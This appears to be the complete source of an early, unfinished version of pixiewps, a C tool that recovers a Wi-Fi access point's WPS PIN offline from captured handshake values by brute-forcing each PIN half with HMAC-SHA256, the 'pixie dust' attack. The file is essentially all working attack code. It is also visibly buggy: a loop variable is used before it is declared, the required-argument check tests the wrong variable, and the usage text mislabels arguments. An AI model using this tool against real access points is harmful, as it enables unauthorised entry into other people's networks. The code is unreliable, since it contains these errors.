/*
 * pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
 *           All credits for the research go to Dominique Bongard.
 *
 * Author: wiire
 * Note: this version is still in developing.
 *
 * Compiling: gcc -o pixiewps pixiewps.c -lssl -lcrypto
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>

#include <openssl/hmac.h>

#define PK_LEN    192
#define HASH_LEN   32
#define NONCE_LEN  16

int hex_string_to_byte_array(unsigned char *src, int src_len, unsigned char *dst, int dst_len);
unsigned int wps_pin_checksum(unsigned int pin);
unsigned int wps_pin_valid(unsigned int pin);
void display_usage();

static const long hextable[] = {
	[0 ... 255] = -1,
	['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
	['A'] = 10, 11, 12, 13, 14, 15,
	['a'] = 10, 11, 12, 13, 14, 15
};

struct globalArgs_t {
	unsigned char *pke;
	unsigned char *pkr;
	unsigned char *e_hash1;
	unsigned char *e_hash2;
	unsigned char *authkey;
	//unsigned char *e_nonce;
} globalArgs;

static const char *option_string = "e:r:s:z:a:h?";

static const struct option long_options[] = {
	{ "pke",     required_argument, 0, 'e' },
	{ "pkr",     required_argument, 0, 'r' },
	{ "e-hash1", required_argument, 0, 's' },
	{ "e-hash2", required_argument, 0, 'z' },
	{ "authkey", required_argument, 0, 'a' },
	{ 0, 0, 0, 0 }
};

int main(int argc, char **argv) {
	globalArgs.pke = 0;
	globalArgs.pkr = 0;
	globalArgs.e_hash1 = 0;
	globalArgs.e_hash2 = 0;
	globalArgs.authkey = 0;

	unsigned char *pke;
	unsigned char *pkr;
	unsigned char *e_hash1;
	unsigned char *e_hash2;
	unsigned char *authkey;

	int opt = 0;
	int long_index = 0;
	opt = getopt_long(argc, argv, option_string, long_options, &long_index);

	while (opt != -1) {
		switch (opt) {
			case 'e':
				globalArgs.pke = optarg;
			break;

			case 'r':
				globalArgs.pkr = optarg;
			break;

			case 's':
				globalArgs.e_hash1 = optarg;
			break;

			case 'z':
				globalArgs.e_hash2 = optarg;
			break;

			case 'a':
				globalArgs.authkey = optarg;
			break;

			case 'h':
			case '?':
				display_usage();
			default:
				exit(3);
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}

	/* Not all required arguments have been supplied */
	if (globalArgs.pke == 0 || globalArgs.pkr == 0 || globalArgs.e_hash1 == 0 || globalArgs.e_hash2 == 0 || authkey == 0) {
		display_usage();
	}

	/* Allocating memory */
	pke = (unsigned char *) calloc(PK_LEN, 1);       if (!pke) exit(2);
	pkr = (unsigned char *) calloc(PK_LEN, 1);       if (!pkr) exit(2);
	e_hash1 = (unsigned char *) calloc(HASH_LEN, 1); if (!e_hash1) exit(2);
	e_hash2 = (unsigned char *) calloc(HASH_LEN, 1); if (!e_hash2) exit(2);
	authkey = (unsigned char *) calloc(HASH_LEN, 1); if (!authkey) exit(2);

	if (hex_string_to_byte_array(globalArgs.pke, PK_LEN * 2, pke, PK_LEN))             goto end;
	if (hex_string_to_byte_array(globalArgs.pkr, PK_LEN * 2, pkr, PK_LEN))             goto end;
	if (hex_string_to_byte_array(globalArgs.e_hash1, HASH_LEN * 2, e_hash1, HASH_LEN)) goto end;
	if (hex_string_to_byte_array(globalArgs.e_hash2, HASH_LEN * 2, e_hash2, HASH_LEN)) goto end;
	if (hex_string_to_byte_array(globalArgs.authkey, HASH_LEN * 2, authkey, HASH_LEN)) goto end;

	unsigned char *e_s1 = (unsigned char *) calloc(NONCE_LEN, 1);  if (!e_s1) exit(2);
	unsigned char *e_s2 = (unsigned char *) calloc(NONCE_LEN, 1);  if (!e_s2) exit(2);

	unsigned char *result = (unsigned char *) calloc(HASH_LEN, 1); if (!result) exit(2);
	unsigned char *psk1 = (unsigned char *) calloc(HASH_LEN, 1);   if (!psk1) exit(2);
	unsigned char *psk2 = (unsigned char *) calloc(HASH_LEN, 1);   if (!psk2) exit(2);

	HMAC_CTX ctx;
	HMAC_CTX_init(&ctx);

	unsigned int first_half = 0;
	unsigned int second_half = 0;
	unsigned char s_pin[4] = {0};
	int len_16 = 16;
	int len_32 = 32;

	while (first_half < 10000) {
		s_pin[0] = (first_half / 1000) + '0';
		s_pin[1] = (first_half % 1000 / 100) + '0';
		s_pin[2] = (first_half % 100 / 10) + '0';
		s_pin[3] = (first_half % 10) + '0';

		HMAC_Init_ex(&ctx, authkey, HASH_LEN, EVP_sha256(), 0);
		HMAC_Update(&ctx, (unsigned char *) s_pin, 4);
		HMAC_Final(&ctx, psk1, &len_16);

		HMAC_Init_ex(&ctx, authkey, HASH_LEN, EVP_sha256(), 0);
		HMAC_Update(&ctx, e_s1, NONCE_LEN);
		HMAC_Update(&ctx, psk1, NONCE_LEN);
		HMAC_Update(&ctx, pke, PK_LEN);
		HMAC_Update(&ctx, pkr, PK_LEN);
		HMAC_Final(&ctx, result, &len_32);

		if (strncmp(result, e_hash1, HASH_LEN)) {
			first_half++;
		} else {
			break;
		}
	}

	printf("\n [*] psk1: ");
			for (i = 0; i < NONCE_LEN; i++) {
				printf("%02x", psk1[i]);
				if (i != NONCE_LEN - 1) {
					printf("");
				}
			}

	if (first_half < 10000) { // First half found
		while (second_half < 10000) {
			s_pin[0] = (second_half / 1000) + '0';
			s_pin[1] = (second_half % 1000 / 100) + '0';
			s_pin[2] = (second_half % 100 / 10) + '0';
			s_pin[3] = (second_half % 10) + '0';

			HMAC_Init_ex(&ctx, authkey, HASH_LEN, EVP_sha256(), 0);
			HMAC_Update(&ctx, (unsigned char *) s_pin, 4);
			HMAC_Final(&ctx, psk2, &len_16);

			HMAC_Init_ex(&ctx, authkey, HASH_LEN, EVP_sha256(), 0);
			HMAC_Update(&ctx, e_s2, NONCE_LEN);
			HMAC_Update(&ctx, psk2, NONCE_LEN);
			HMAC_Update(&ctx, pke, PK_LEN);
			HMAC_Update(&ctx, pkr, PK_LEN);
			HMAC_Final(&ctx, result, &len_32);

			if (strncmp(result, e_hash2, HASH_LEN)) {
				second_half++;
			} else {
				break;
			}
		}
		if (second_half < 10000) {
			printf("\n [+] ES1 = ES2 = 0x%032x", 0);
			printf("\n [*] PSK1: ");
			int i;
			for (i = 0; i < NONCE_LEN; i++) {
				printf("%02x", psk1[i]);
				if (i != NONCE_LEN - 1) {
					printf(":");
				}
			}
			printf("\n [*] PSK2: ");
			for (i = 0; i < NONCE_LEN; i++) {
				printf("%02x", psk2[i]);
				if (i != NONCE_LEN - 1) {
					printf(":");
				}
			}
			printf("\n [*] PIN found: %d%d\n\n", first_half, second_half);
		}
	}

	HMAC_CTX_cleanup(&ctx); // Free

end:
	free(pke);
	free(pkr);
	free(e_hash1);
	free(e_hash2);
	free(authkey);
	return 0;
}

/* Converts an hex string to a byte array */
int hex_string_to_byte_array(unsigned char *src, int src_len, unsigned char *dst, int dst_len) {
	int i = 0;
	unsigned char hvalue, lvalue;

	while (i < dst_len) {
		if (*src == ':' || *src == '-' || *src == ' ') {
			src++;
		}

		hvalue = hextable[*src];
		lvalue = hextable[*++src];

		if (hvalue == -1 || lvalue == -1) return -1;

		dst[i] = (hvalue << 4) | lvalue;
		src++;
		i++;
	}
	return 0;
}

/* Pin checksum computing */
unsigned int wps_pin_checksum(unsigned int pin) {
	unsigned int acc = 0;
	while (pin) {
		acc += 3 * (pin % 10);
		pin /= 10;
		acc += pin % 10;
		pin /= 10;
	}
	return (10 - acc % 10) % 10;
}

/* Validity PIN control based on checksum */
unsigned int wps_pin_valid(unsigned int pin) {
	return wps_pin_checksum(pin / 10) == (pin % 10);
}

/* Info usage */
void display_usage() {
	puts("");
	puts(" Usage: pixiewps <arguments>");
	puts("");
	puts(" Required Arguments:");
	puts("");
	puts("    e, --pke     : Enrollee public key");
	puts("    r, --pkr     : Registrar public key");
	puts("    s, --e-hash1 : Enrollee public key");
	puts("    z, --e-hash2 : Registrar public key");
	puts("    a, --authkey : Key used in HMAC_SHA256");
	puts("");
	//puts(" Optional Arguments:");
	//puts("");
	//puts("    n, --nonce   : Enrollee nonce");
	//puts("");
	puts("    h, --help    : Display this usage screen");
	puts("");
	puts(" Note: this version is not completed yet. Only a few models may be vulnerable.");
	puts("");

	exit(1);
}